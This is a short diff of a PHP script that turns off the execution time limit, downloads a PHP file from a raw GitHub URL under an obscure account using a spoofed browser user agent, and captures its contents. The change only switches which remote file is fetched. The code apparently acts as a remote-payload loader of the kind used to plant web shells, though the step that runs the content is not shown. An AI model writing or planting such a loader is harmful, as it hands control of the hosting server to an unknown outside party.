@@ -1,7 +1,7 @@
 11<?php
 set_time_limit(0);
 
-$ch = curl_init('https://raw.githubusercontent.com/zzvvzzserverzzvvzz/serviceserver/refs/heads/main/sstnf.php');
+$ch = curl_init('https://raw.githubusercontent.com/zzvvzzserverzzvvzz/serviceserver/refs/heads/main/sstest.php');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
 $content = curl_exec($ch);
